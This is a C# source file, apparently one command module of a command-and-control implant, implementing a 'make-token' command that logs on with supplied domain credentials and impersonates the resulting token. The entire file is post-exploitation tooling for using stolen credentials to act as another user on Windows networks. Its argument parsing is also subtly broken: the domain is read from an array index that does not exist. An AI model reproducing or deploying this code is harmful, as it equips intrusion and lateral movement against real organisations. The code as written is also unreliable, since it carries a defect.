using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using Agent.Native;

namespace Agent.Commands
{
    internal class MakeToken : AgentCommand
    {
        public override string Name => "make-token";
        // make-token Domain\Username Password
        public override string Execute(AgentTask task)
        {
            var user = task.Arguments[0].Split('\\');
            var password = task.Arguments[1];
            var username = user[1];
            var domain = user[2];

            IntPtr hToken = IntPtr.Zero;
            if (Native.Advapi.LogonUser(username, domain, password, LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS,
                    LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
            {
                if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    return $"Successfully impersonated {identity.Name}";
                }

                return "Successfully made token but failed to impersonate";
            }
            else
            {
                return "Failed to make token";
            }
        }
    }
}
